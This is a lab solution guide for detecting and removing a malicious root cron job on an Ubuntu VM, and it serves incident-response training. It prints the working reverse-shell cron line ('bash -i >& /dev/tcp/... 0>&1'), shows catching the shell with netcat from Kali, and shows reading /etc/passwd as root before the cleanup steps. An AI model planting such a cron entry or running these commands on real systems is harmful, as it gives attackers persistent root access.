## Solution Guide: Attacking `cron`

Completing this activity required the following steps: 

- Using `sudo su` to acquire root privilege user access.
- Using `netstat -atp` to check for established TCP connections.
- Using `sudo crontab -l` to inspect the `root` user's crontab.
- Using `nc -nvlp 888` to open a listener in an attacker's terminal.
- Using `kill (PID)` to terminate an active TCP connection.
- Using `sudo crontab -e` to edit the `root` user's crontab.

### Identifying Rogue Connections

- Inspect your network connections. **Note:** Not all processes can be identified, since non-owned process info will not be shown. You will need to be root to see it all active tcp connections.

     - Run: `sudo su`

- Look for established TCP port connections using the `netstat` command which also displays foreign port and address information. The output should also display the process ID (`PID`) and program name.

    - Run `netstat -atp`
  ```bash
  $ netstat -atp
  Active Internet connections (servers and established)
  Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
  tcp        0      0 localhost:domain        0.0.0.0:*               LISTEN      415/systemd-resolve
  tcp        0      0 localhost:ipp           0.0.0.0:*               LISTEN      541/cupsd           
  tcp        0      0 ubuntu:40444            192.168.188.164:888     ESTABLISHED 5553/bash           
  tcp6       0      0 ip6-localhost:ipp       [::]:*                  LISTEN      541/cupsd           
  ```

- Inspect the `root` crontab and look for any suspicious cron jobs.

    - Run `sudo crontab -l`
  ```bash
  $ sudo crontab -l
  */1 *   * * *           /bin/bash -c 'bash -i >& /dev/tcp/192.168.188.164/888 0>&1'
  ```

### Inspecting Processes

- Launch Kali Linux within your virtual machine environment, log in, and open a new terminal.

- Using Netcat, establish a listener to the port identified in the Netcat output from earlier.

  - Run `nc -nvlp 888`

  - Since the attacker's `cron` job runs every minute, wait for the next cycle. After waiting one minute you should get a command prompt with root privileges.

    ```bash
    $ nc -nvlp 888
    listening on [any] 888 ...

    connect to [192.168.188.164] from (UNKNOWN) [192.168.188.163] 36266
    bash: cannot set terminal process group (5878): Inappropriate ioctl for device
    bash: no job control in this shell
    root@ubuntu:~#
    ```
Let's have some fun and run a few commands:

- Run `whoami` and observe the output.
  
    ```bash
    $ whoami
    root
    ```

- Run `uname -a` and observe the output.
  
    ```bash
    $ uname -a
    Linux ubuntu 5.0.0-31-generic #33~18.04.1-Ubuntu SMP Tue Oct 1 10:20:39 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
    ```

- Run `cat /etc/passwd` and observe the output.
  
    ```bash
    $ cat /etc/passwd
    root:x:0:0:root:/root:/bin/bash
    daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
    bin:x:2:2:bin:/bin:/usr/sbin/nologin
    sys:x:3:3:sys:/dev:/usr/sbin/nologin
    sync:x:4:65534:sync:/bin:/bin/sync
    games:x:5:60:games:/usr/games:/usr/sbin/nologin
    man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
    lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
    mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
    news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
    uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
    proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
    www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
    backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
    list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
    irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
    gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
    nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
    _apt:x:100:65534::/nonexistent:/usr/sbin/nologin
    systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
    systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
    systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
    mysql:x:104:110:MySQL Server,,,:/nonexistent:/bin/false
    ntp:x:105:111::/nonexistent:/usr/sbin/nologin
    messagebus:x:106:112::/nonexistent:/usr/sbin/nologin
    arpwatch:x:107:113:ARP Watcher,,,:/var/lib/arpwatch:/bin/sh
    Debian-exim:x:108:114::/var/spool/exim4:/usr/sbin/nologin
    uuidd:x:109:115::/run/uuidd:/usr/sbin/nologin
    redsocks:x:110:116::/var/run/redsocks:/usr/sbin/nologin
    tss:x:111:117:TPM2 software stack,,,:/var/lib/tpm:/bin/false
    rwhod:x:112:65534::/var/spool/rwho:/usr/sbin/nologin
    iodine:x:113:65534::/var/run/iodine:/usr/sbin/nologin
    miredo:x:114:65534::/var/run/miredo:/usr/sbin/nologin
    dnsmasq:x:115:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
    postgres:x:116:121:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
    usbmux:x:117:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
    rtkit:x:118:123:RealtimeKit,,,:/proc:/usr/sbin/nologin
    stunnel4:x:119:127::/var/run/stunnel4:/usr/sbin/nologin
    sshd:x:120:65534::/run/sshd:/usr/sbin/nologin
    Debian-snmp:x:121:128::/var/lib/snmp:/bin/false
    sslh:x:122:129::/nonexistent:/usr/sbin/nologin
    pulse:x:123:131:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
    speech-dispatcher:x:124:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false
    avahi:x:125:134:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
    saned:x:126:135::/var/lib/saned:/usr/sbin/nologin
    inetsim:x:127:137::/var/lib/inetsim:/usr/sbin/nologin
    colord:x:128:138:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
    geoclue:x:129:139::/var/lib/geoclue:/usr/sbin/nologin
    king-phisher:x:130:140::/var/lib/king-phisher:/usr/sbin/nologin
    Debian-gdm:x:131:141:Gnome Display Manager:/var/lib/gdm3:/bin/false
    dradis:x:132:142::/var/lib/dradis:/usr/sbin/nologin
    beef-xss:x:133:143::/var/lib/beef-xss:/usr/sbin/nologin
    systemd-coredump:x:999:999:systemd Core Dumper:/:/sbin/nologin
    _rpc:x:134:65534::/run/rpcbind:/usr/sbin/nologin
    statd:x:135:65534::/var/lib/nfs:/usr/sbin/nologin
    ftp:x:136:145:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
    ```

### Eliminating the Root Cause

- Kill the process running the reverse shell by terminating the `PID`, or process ID.

    - Run `kill 5553`


- Remove the `cron` job from the `root` crontab. Edit the crontab, scroll to the bottom and delete the malicious `cron` job.

    - Run `sudo crontab -e`

    ```bash
    $ sudo crontab -e
    */1 * * * *  /bin/bash -c 'bash -i >& /dev/tcp/192.168.188.164/888 0>&1'
    ```
